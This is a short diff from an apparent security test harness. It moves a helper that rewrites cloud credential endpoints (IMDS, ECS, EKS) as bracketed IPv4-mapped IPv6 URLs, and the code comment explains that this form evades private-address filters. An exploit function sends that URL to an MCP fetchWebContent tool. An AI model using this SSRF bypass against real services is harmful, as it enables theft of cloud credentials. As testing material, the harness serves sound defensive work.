@@ -36,18 +36,18 @@ KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identit
 STAND_IN_HOST = "html.duckduckgo.com"
 
 
-def _mapped_url(places: Places, place_id: str) -> str:
-    # The place's IPv4 host rewritten as a bracketed IPv4-mapped IPv6 literal: a bare private-range
-    # literal is caught on both versions, so the bracketed form is what carries the bypass.
-    coordinates = places[place_id].coordinates
-    return f"http://[::ffff:{coordinates.host}]{coordinates.path}"
-
-
 def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
     async def run(places: Places, client: MCPClientPort) -> None:
         await client.call_tool("fetchWebContent", {"url": _mapped_url(places, place_id)})
 
     return run
+
+
+def _mapped_url(places: Places, place_id: str) -> str:
+    # The place's IPv4 host rewritten as a bracketed IPv4-mapped IPv6 literal: a bare private-range
+    # literal is caught on both versions, so the bracketed form is what carries the bypass.
+    coordinates = places[place_id].coordinates
+    return f"http://[::ffff:{coordinates.host}]{coordinates.path}"
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
